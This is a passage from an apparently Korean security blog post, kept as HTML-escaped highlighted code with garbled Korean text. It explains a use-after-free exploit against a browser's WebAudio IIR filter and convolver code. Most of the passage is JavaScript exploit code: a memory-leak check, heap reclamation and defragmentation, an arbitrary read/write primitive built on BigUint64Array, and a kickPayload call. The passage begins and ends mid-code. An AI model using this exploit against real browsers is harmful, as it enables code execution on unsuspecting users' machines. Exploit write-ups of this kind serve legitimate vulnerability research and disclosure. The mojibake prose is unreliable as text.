        		&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// wait 1 millisecond&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          	   &lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFrequencyResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
         		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.1415927410125732&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             			&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
             	     		&lt;span class=&quot;nx&quot;&gt;audioBufferArray2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                 		&lt;span class=&quot;nx&quot;&gt;audioBufferArray2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
 
            			&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            			&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
            			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
    		&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;smallAudioBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;later&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// wait 1 millisecond&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ë ‡ê²Œ leakì´ ì„±ê³µí–ˆìœ¼ë©´ exploitì„ í•˜ê¸° ìœ„í•´ í•œë²ˆë” ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IIRDSPKernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GetFrequencyResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n_frequencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    	&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;frequency_hz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    	&lt;span class=&quot;nx&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mag_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    	&lt;span class=&quot;nx&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;phase_response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;Vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;frequency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n_frequencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nyquist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Nyquist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// Convert from frequency in Hz to normalized frequency (0 -&amp;gt; 1),&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// with 1 equal to the Nyquist frequency.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n_frequencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;frequency&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;frequency_hz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nyquist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´ ê³¼ì •ì—ì„œ ì·¨ì•½ì  íŠ¸ë¦¬ê±°ê°€ ì„±ê³µí–ˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ getFrequencyResponse í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” Nyquist í•„í„°ë¡œ ì±„ì›Œì§„ frequencies ë°°ì—´ì„ ìƒì„±í•˜ê³  ì—°ì‚°ì— ì‚¬ìš©ë˜ëŠ” ë°°ì—´ì€ 0ìœ¼ë¡œ ì´ˆê¸°í™”ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finalUAFCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
         	&lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFrequencyResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.1415927410125732&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;audioBufferArray2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                 		&lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sharedAudioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	     		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;336&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            			&lt;span class=&quot;nx&quot;&gt;imageDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ImageData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        		&lt;span class=&quot;nx&quot;&gt;imageDataArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;kickPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë”°ë¼ì„œ ê²°ê³¼ì— Ï€ ì´ì™¸ì˜ ê°’ì´ í¬í•¨ë˜ë©´ exploitì´ ì„±ê³µí•œ ê²ƒì´ë¼ íŒë‹¨í•©ë‹ˆë‹¤. ì´ ê²½ìš°ì— ì¬ê·€ë¥¼ ë©ˆì¶”ê³  finalUAFCallback í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ì˜¤ë””ì˜¤ ì±„ë„ ë²„í¼ë¥¼ ì¬í• ë‹¹í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ì „ì— freeëœ ë©”ëª¨ë¦¬ë“¤ì„ íšŒìˆ˜í•©ë‹ˆë‹¤. ë˜í•œ ë‹¤ì–‘í•œ ê°ì²´ë¥¼ í• ë‹¹í•˜ê³  defragmentationë¥¼ ìˆ˜í–‰í•˜ì—¬ í™ì„ ë³µêµ¬í•©ë‹ˆë‹¤. ì´í›„ BigUint64Arrayë¥¼ ì´ìš©í•´ arbitrary read/write í”„ë¦¬ë¯¸í‹°ë¸Œë¥¼ ì–»ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finalUAFCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
